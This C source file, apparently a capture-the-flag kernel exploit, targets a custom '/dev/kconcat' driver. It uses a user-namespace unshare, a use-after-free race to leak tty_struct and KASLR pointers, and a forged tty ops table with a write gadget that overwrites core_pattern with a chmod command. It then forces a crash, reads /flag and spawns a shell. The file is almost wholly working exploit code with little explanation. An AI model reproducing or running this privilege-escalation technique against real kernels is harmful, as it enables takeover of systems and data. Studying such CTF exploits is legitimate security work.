// Copyright 2023 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <pthread.h>

#define u64 unsigned long long
#define u8 unsigned char

void hexdump(u8* buf, int size) {
    for (int i = 0; i < size; i++) {
        if (i % 16 == 0)
            printf("%04x: ", i);
        printf("%02x ", buf[i]);
        if (i % 16 == 15)
            printf("\n");
    }
    if (size % 16 != 0)
        printf("\n");
}

#define LOG(cmd) ({ printf("[%s] " #cmd " = ", __func__); errno = 0; int ret = cmd; printf("%d", ret); if (errno != 0) printf(", errno: %d (%s)", errno, strerror(errno)); puts(""); ret; })
#define LOGERR(cmd) ({ errno = 0; int ret = cmd; if (errno != 0) printf("[!!!] [%s] " #cmd " = %d, errno: %d (%s)\n", __func__, ret, errno, strerror(errno)); ret; })

void turn_on_admin(int fd) {
    u8 buf[1024] = { 0 };

	int pid = fork();
	if (pid == 0) {
        printf("child: running setuid command\n");
        dup2(fd, 1);
        close(fd);
        execlp("/usr/bin/mount", "", (char*) 0);
        printf("child: running setuid command - FAIL\n");
        exit(-1);
	}
    printf("parent: waiting for child\n");
    waitpid(pid, NULL, 0);
    printf("parent: waiting for child - DONE\n");

    int len = LOG(read(fd, buf, sizeof(buf)));
    printf("content: %s\n", buf);
    hexdump(buf, len);
}

void do_unshare(const char* execpath) {
    u8 cmd[128] = { 0 };
    snprintf(cmd, sizeof(cmd), "unshare -Urm %s", execpath);
    system(cmd);
}

int admin_fd;

struct leak_request {
    int fd;
    u8* buf;
    int size;
    u64 read_len;
};

void* reader_thread(void* req_) {
    struct leak_request *req = (struct leak_request *) req_;
    int len = LOGERR(read(req->fd, req->buf, req->size));
    return (void*) (u64) len;
}

int trigger(struct leak_request* leakreq, const u8* pipename, u8* ov, int ov_size) {
    char fn[128] = { 0 };
    snprintf(fn, sizeof(fn), "/etc/kconcat/message-templates/%s", pipename);
    int tmpl_fd_writer = LOG(open(fn, O_RDWR));

    LOGERR(ioctl(leakreq->fd, 0x1234, pipename));

    pthread_t thread;
    LOGERR(pthread_create(&thread, NULL, &reader_thread, leakreq));

    usleep(20*1000); // make sure read is executed
    LOGERR(ioctl(admin_fd, 0x1337, pipename)); // trigger kfree
    int ptmx_fd = LOGERR(open("/dev/ptmx", O_RDONLY | O_NOCTTY));
    LOGERR(write(tmpl_fd_writer, ov, ov_size));
    //LOGERR(close(tmpl_fd_writer));

    LOGERR(pthread_join(thread, (void *) &leakreq->read_len));

    //printf("buf content: %s\n", leak);
    return ptmx_fd;
}

u64 leak2(const u8* pipename, u8* ov, int ov_size) {
    int fd = LOGERR(open("/dev/kconcat", O_RDWR));
    u8 leak[512] = { 0 };
    struct leak_request leakreq = { fd, &leak[0], sizeof(leak) };
    trigger(&leakreq, pipename, ov, ov_size);
    int len = leakreq.read_len;
    if (len < ov_size + 8) {
        printf("[!] failed to leak! len=%d\n", len);
        return 0;
    } else {
        hexdump(leak, len);
        u64 value = *(u64*)&leak[ov_size];
        //printf("leaked: %llx\n", value);
        return value;
    }
}

u64 leak(const u8* pipename, int pos) {
    int ov_size = pos - 4;
    char* ov = malloc(ov_size);
    memset(ov, 'A', ov_size); // overwrite tty_struct until heap|kaslr pointers to leak
    return leak2(pipename, ov, ov_size);
}

u64 store_and_leak(const u8* pipename, u8* buf, u8* ov_end, int leak_offs) {
    int ov_size = ov_end - buf;
    printf("store_and_leak: ov_size=%d, leak_offs=%d\n", ov_size, leak_offs);
    for (int i = 0; i < ov_size; i++)
        if (buf[i] == 0) {
            printf("content contains 0x00, failed! pos=%x\n", i);
            hexdump(buf, ov_size);
            exit(1);
        }

    if (ov_size > leak_offs) {
        printf("store_and_leak: ov_size (%d) > leak_offs (%d)\n", ov_size, leak_offs);
        exit(1);
    }

    memset(ov_end, 'A', leak_offs - ov_size);
    return leak2(pipename, buf, leak_offs - 4);
}

u64 store_tty(const u8* pipename, u8* buf, u8* ov_end) {
    u64 leak = store_and_leak(pipename, buf, ov_end, 0x100);
    u64 base = leak - 0xf8;
    printf("store_tty: leak: %llx, base: %llx\n", leak, base);
    if ((base & 0x3ff) != 0) {
        printf("[-] store_tty failed!\n");
        exit(1);
    }

    return base;
}

int main_within_userns2(int admin_fd) {
    u8 pipename[] = "deletethis";

    LOGERR(mount("tmpfs", "/etc/kconcat/message-templates", "tmpfs", 0, 0));
    LOGERR(mkfifo("/etc/kconcat/message-templates/deletethis", 0666));

    u64 kaslr_leak = leak(pipename, 0x18);
    u64 kaslr_base = kaslr_leak - 0x82280c80 + 0x81000000; // readelf -Ws --dyn-syms vmlinux |grep ptm_unix98_ops
    printf("kaslr_leak: %llx, kaslr_base: %llx\n", kaslr_leak, kaslr_base);
    if ((kaslr_base & 0xfffff) != 0) {
        printf("[-] kaslr leak failed!\n");
        return 1;
    }

    u64 CORE_PATTERN = kaslr_base + 0x196bfe0; // readelf -Ws --dyn-syms vmlinux|grep core_pattern
    // 0xffffffff8105f308 : mov dword ptr [rdx], ecx ; jmp 0xffffffff82003240
    u64 MOV_DWORD_RDX_ECX = kaslr_base + 0x5f308;

    u8 ops_buf[512] = { 0 };
    u64* ops = (u64*)&ops_buf[0];
    *ops++ = 0x4949494949494949; // misalignment padding

    for (int i = 0; i < 96 / 8; i++)
        *ops++ = 0x4848484848484848;

    *ops++ = MOV_DWORD_RDX_ECX; // rsp will be fake_ops

    u64 ops_tty_base = store_tty(pipename, &ops_buf[4], (u8*)ops);

    int fd = LOG(open("/dev/kconcat", O_RDWR));
    u8 buf[512];
    struct leak_request leakreq = { fd, buf, sizeof(buf), 0 };

    u8 fake_tty[512];
    u64* fake_tty_ptr = (u64*)&fake_tty[0];
    *fake_tty_ptr++ = 0x4242424242424242; // kref
    *fake_tty_ptr++ = 0x4343434343434343;
    *fake_tty_ptr++ = ops_tty_base; // driver, needs to be valid pointer, otherwise don't care
    *fake_tty_ptr++ = ops_tty_base + 8; // fake_ops
    int ptmx_fd = trigger(&leakreq, pipename, &fake_tty[4], (u8*)fake_tty_ptr - &fake_tty[4]);

    //ioctl(ptmx_fd, 0x4545454545454545, 0x4646464646464646);
    // RAX: 4141414141414141 RBX: fffffe942cc9dc01 RCX: 0000000045454545
    // RDX: 4646464646464646 RSI: 0000000045454545 RDI: fffffe942ccd0c00
    // RBP: 0000000045454545 R08: 4646464646464646 R09: 0000000000000000
    // R10: ffffa086801e7ee8 R11: 0000000000000045 R12: 4646464646464646

    char pattern[] = "|/bin/chmod 666 /flag core\0";
    for (int i = 0; i < sizeof(pattern); i += 4)
        printf("ioctl: %d, errno: %d\n", ioctl(ptmx_fd, *((int*)&pattern[i]), CORE_PATTERN + i), errno);
}

int main(int argc, const char** argv) {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (argc > 1 && !strcmp(argv[1], "crashme"))
        *(int*)0 = 0;

    printf("argc = %d, argv[0] = %s, argv[1] = %s\n", argc, argc > 0 ? argv[0] : 0, argc > 1 ? argv[1] : 0);
    system("id");

    if (getuid() == 0) {
        admin_fd = atoi(argv[1]);
        main_within_userns2(admin_fd);
        system("/tmp/exploit/exp crashme");
        system("cat /flag");
        system("/bin/bash");
        sleep(1000);
    } else {
        int admin_fd = LOG(open("/dev/kconcat", O_RDWR));
        turn_on_admin(admin_fd);

        char cmd[128];
        snprintf(cmd, sizeof(cmd), "%s %d", argv[0], admin_fd);
        do_unshare(cmd);
        return 0;
    }
    return 0;
}
